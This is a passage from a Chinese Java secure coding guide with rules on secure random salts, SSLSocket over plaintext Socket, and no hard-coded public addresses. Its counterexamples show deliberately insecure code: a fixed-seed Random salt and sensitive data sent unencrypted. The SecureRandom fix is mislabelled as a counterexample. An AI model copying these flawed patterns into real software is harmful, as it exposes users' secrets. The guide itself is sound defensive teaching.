- 用于密码算法用途，如生成IV、盐值、密钥等；
- 会话标识（sessionId）的生成；
- 挑战算法中的随机数生成；
- 验证码的随机数生成；

**【反例】**

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    Random random = new Random(123456L);
    random.nextBytes(salt);
    return salt;
}
```

`Random`生成是不安全随机数，不能用做盐值。

**【反例】**

```java
public byte[] generateSalt() {
    byte[] salt = new byte[8];
    SecureRandom random = new SecureRandom();
    random.nextBytes(salt);
    return salt;
}
```

#### 必须使用SSLSocket代替Socket来进行安全数据交互

**【描述】**

当网络通信中涉及明文的敏感信息时，需要使用SSLSocket而不是Socket，Socket是明文通信，攻击者可以通过网络监听获取其中的敏感信息，通过中间人攻击对报文进行恶意篡改。SSLSocket是在Socket的基础上进行了一个层安全性保护，包括身份认证、数据加密和完整性保护。

**【反例】**

```java
try {
    Socket socket = new Socket();
    socket.connect(new InetSocketAddress(ip, port), 10000);
    os = socket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    // 处理异常
} finally {
    // 关闭流
}
```

上述代码中使用socket来明文传输报文信息，报文中的敏感信息存在泄露及篡改的风险。

**【正例】**

```java
try {
    SSLSocketFactory sslSocketFactory =
        (SSLSocketFactory) SSLSocketFactory.getDefault();
    SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(ip, port);
    os = sslSocket.getOutputStream();
    os.write(userInfo.getBytes(StandardCharsets.UTF_8));
    ...
} catch (IOException ex) {
    // 处理异常
} finally {
    // 关闭流
}
```

该正确代码示例中，SSLSocket来使用SSL/TLS安全协议保护传输的报文。

**【例外】**

因为SSLSocket提供的报文安全传输机制，将造成巨大的性能开销。在以下情况下，普通的套接字就可以满足需求：

- 套接字上传输的数据不敏感。
- 数据虽然敏感，但是已经过恰当加密。

#### 禁止代码中包含公网地址

**【级别】** 要求

**【描述】**

代码或脚本中包含用户不可见，不可知的公网地址，可能会引起客户质疑。

对产品发布的软件（包含软件包/补丁包）中包含的公网地址（包括公网IP地址、公网URL地址/域名、邮箱地址）要求如下：
1、禁止包含用户界面不可见、或产品资料未描述的未公开的公网地址。
2、已公开的公网地址禁止写在代码或者脚本中，可以存储在配置文件或数据库中。

对于开源/第三方软件自带的公网地址必须至少满足上述第1条公开性要求。

**【例外】**

对于标准协议中必须指定公网地址的场景可例外，如soap协议中函数的命名空间必须指定的一个组装的公网URL、http页面中包含w3.org网址、XML解析器中的Feature名等。